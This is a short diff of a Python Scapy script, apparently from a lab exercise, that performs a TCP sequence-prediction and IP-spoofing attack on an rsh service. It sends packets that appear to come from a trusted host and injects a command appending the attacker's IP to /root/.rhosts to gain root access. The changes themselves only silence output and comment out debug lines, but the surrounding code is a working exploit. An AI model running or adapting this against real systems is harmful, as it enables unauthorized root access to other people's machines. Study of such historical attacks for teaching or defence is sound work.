@@ -20,15 +20,15 @@ if __name__ == "__main__":
     
     # reset port after initial experiment
     rst_packet = TCP(sport=source_port, dport=514, flags="R")
-    send(ip / rst_packet)
+    send(ip / rst_packet, verbose=0)
 
     #print(i, syn_packet[TCP].sport)
-    if synack_packet:
-        synack_packet.show()
+    #if synack_packet:
+    #    synack_packet.show()
     
 
     spoof_ip = IP(dst=target_ip, src=trusted_host_ip)
-    send(spoof_ip / syn_packet)
+    send(spoof_ip / syn_packet, verbose=0)
 
     next_seq = synack_packet[TCP].seq + 64000
 
@@ -38,6 +38,6 @@ if __name__ == "__main__":
 
     hack_data = b"root\x00root\x00echo '" + my_ip.encode('utf-8') + b" root' >> /root/.rhosts\x00"
     
-    send(spoof_ip / spoof_ack_packet)
+    send(spoof_ip / spoof_ack_packet, verbose=0)
     
-    send(spoof_ip / ap_packet / (b'\x00'+hack_data))
+    send(spoof_ip / ap_packet / (b'\x00'+hack_data), verbose=0)
